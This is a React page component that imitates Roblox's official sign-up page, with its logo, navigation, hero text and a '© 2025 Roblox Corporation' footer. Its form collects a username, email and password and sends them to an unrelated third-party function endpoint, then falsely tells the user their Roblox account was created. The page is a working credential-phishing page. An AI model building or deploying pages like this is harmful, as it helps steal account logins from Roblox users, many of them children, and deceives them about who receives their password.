import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card } from '@/components/ui/card';
import { useToast } from '@/hooks/use-toast';
import Icon from '@/components/ui/icon';

const Index = () => {
  const { toast } = useToast();
  const [formData, setFormData] = useState({
    username: '',
    email: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const response = await fetch('https://functions.poehali.dev/dc09bade-aa8a-41d7-87df-0f7ae1969e91', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        toast({
          title: "Welcome to Roblox!",
          description: "Your account has been created successfully.",
        });
        setFormData({ username: '', email: '', password: '' });
      } else {
        throw new Error('Registration failed');
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white">
      <header className="bg-[#191919] text-white">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center gap-8">
              <div className="flex items-center gap-2">
                <img src="/img/4c516743-a327-4741-913b-30474c647474.jpg" alt="Roblox" className="h-8 w-8 rounded" />
                <span className="font-bold text-xl">Roblox</span>
              </div>
              <nav className="hidden md:flex items-center gap-6">
                <a href="#" className="text-sm font-semibold hover:text-gray-300 transition">Discover</a>
                <a href="#" className="text-sm font-semibold hover:text-gray-300 transition">Marketplace</a>
                <a href="#" className="text-sm font-semibold hover:text-gray-300 transition">Create</a>
                <a href="#" className="text-sm font-semibold hover:text-gray-300 transition">Robux</a>
              </nav>
            </div>
            <div className="flex items-center gap-3">
              <Button variant="ghost" className="text-white hover:bg-white/10 text-sm font-semibold">
                Log In
              </Button>
              <Button className="bg-[#00A2FF] hover:bg-[#0088D9] text-white text-sm font-bold px-6 rounded">
                Sign Up
              </Button>
            </div>
          </div>
        </div>
      </header>

      <main>
        <section className="bg-gradient-to-b from-[#00A2FF] to-[#0088D9] py-20">
          <div className="container mx-auto px-4">
            <div className="max-w-6xl mx-auto grid md:grid-cols-2 gap-12 items-center">
              <div className="text-white">
                <h1 className="text-5xl md:text-6xl font-black mb-6 leading-tight">
                  A Universe Waiting to be Explored
                </h1>
                <p className="text-xl mb-8 text-white/90">
                  Join millions of people and discover an infinite variety of immersive experiences created by a global community!
                </p>
                <Button 
                  size="lg" 
                  className="bg-[#00B06F] hover:bg-[#00954D] text-white font-bold text-lg px-8 h-14 rounded"
                  onClick={() => document.getElementById('signup-form')?.scrollIntoView({ behavior: 'smooth' })}
                >
                  Sign Up and Start Having Fun
                </Button>
              </div>
              <div className="flex justify-center">
                <img 
                  src="/img/577c9623-aa74-426e-b317-d2546cb4fca2.jpg" 
                  alt="Roblox Characters" 
                  className="w-full max-w-md rounded-lg shadow-2xl"
                />
              </div>
            </div>
          </div>
        </section>

        <section className="py-20 bg-gray-50">
          <div className="container mx-auto px-4">
            <div className="max-w-2xl mx-auto text-center mb-12">
              <h2 className="text-4xl font-black mb-4 text-[#191919]">What Do You Want to Make?</h2>
              <p className="text-lg text-gray-600">Build immersive 3D experiences on Roblox with a suite of developer tools.</p>
            </div>
            <div className="grid md:grid-cols-3 gap-6 max-w-5xl mx-auto">
              {[
                { icon: 'Gamepad2', title: 'Games', desc: 'Create multiplayer games' },
                { icon: 'Users', title: 'Experiences', desc: 'Build virtual worlds' },
                { icon: 'Trophy', title: 'Compete', desc: 'Join the competition' }
              ].map((item, idx) => (
                <Card key={idx} className="p-6 hover:shadow-lg transition border-2">
                  <div className="bg-[#00A2FF] w-12 h-12 rounded-lg flex items-center justify-center mb-4">
                    <Icon name={item.icon as any} className="text-white" size={24} />
                  </div>
                  <h3 className="text-xl font-bold mb-2">{item.title}</h3>
                  <p className="text-gray-600">{item.desc}</p>
                </Card>
              ))}
            </div>
          </div>
        </section>

        <section id="signup-form" className="py-20 bg-white">
          <div className="container mx-auto px-4">
            <div className="max-w-md mx-auto">
              <Card className="p-8 shadow-xl border-2">
                <h2 className="text-3xl font-black mb-2 text-center text-[#191919]">Sign Up</h2>
                <p className="text-center text-gray-600 mb-8">Join the Roblox community today!</p>
                
                <form onSubmit={handleSubmit} className="space-y-4">
                  <div>
                    <label className="block text-sm font-semibold mb-2 text-gray-700">
                      Username
                    </label>
                    <Input
                      type="text"
                      value={formData.username}
                      onChange={(e) => setFormData({ ...formData, username: e.target.value })}
                      required
                      className="h-12 border-2 focus:border-[#00A2FF] focus:ring-[#00A2FF]"
                      placeholder="Choose a username"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-semibold mb-2 text-gray-700">
                      Email
                    </label>
                    <Input
                      type="email"
                      value={formData.email}
                      onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                      required
                      className="h-12 border-2 focus:border-[#00A2FF] focus:ring-[#00A2FF]"
                      placeholder="your@email.com"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-semibold mb-2 text-gray-700">
                      Password
                    </label>
                    <Input
                      type="password"
                      value={formData.password}
                      onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                      required
                      className="h-12 border-2 focus:border-[#00A2FF] focus:ring-[#00A2FF]"
                      placeholder="Create a password"
                    />
                  </div>

                  <Button
                    type="submit"
                    disabled={isLoading}
                    className="w-full h-12 bg-[#00B06F] hover:bg-[#00954D] text-white font-bold text-base rounded mt-6"
                  >
                    {isLoading ? 'Creating Account...' : 'Sign Up'}
                  </Button>

                  <p className="text-center text-sm text-gray-600 mt-4">
                    Already have an account?{' '}
                    <a href="#" className="text-[#00A2FF] font-semibold hover:underline">
                      Log In
                    </a>
                  </p>
                </form>
              </Card>
            </div>
          </div>
        </section>
      </main>

      <footer className="bg-[#191919] text-white py-12">
        <div className="container mx-auto px-4">
          <div className="grid md:grid-cols-4 gap-8 mb-8">
            <div>
              <h4 className="font-bold mb-4">About Us</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><a href="#" className="hover:text-white">About</a></li>
                <li><a href="#" className="hover:text-white">Jobs</a></li>
                <li><a href="#" className="hover:text-white">Blog</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-4">Help</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><a href="#" className="hover:text-white">Customer Support</a></li>
                <li><a href="#" className="hover:text-white">Safety</a></li>
                <li><a href="#" className="hover:text-white">Parents Guide</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-4">Community</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><a href="#" className="hover:text-white">Forum</a></li>
                <li><a href="#" className="hover:text-white">Events</a></li>
                <li><a href="#" className="hover:text-white">Developers</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-4">Social</h4>
              <div className="flex gap-3">
                <a href="#" className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center hover:bg-white/20 transition">
                  <Icon name="Twitter" size={18} />
                </a>
                <a href="#" className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center hover:bg-white/20 transition">
                  <Icon name="Youtube" size={18} />
                </a>
                <a href="#" className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center hover:bg-white/20 transition">
                  <Icon name="Facebook" size={18} />
                </a>
              </div>
            </div>
          </div>
          <div className="border-t border-white/10 pt-8 text-center text-sm text-gray-400">
            <p>© 2025 Roblox Corporation. All rights reserved.</p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Index;
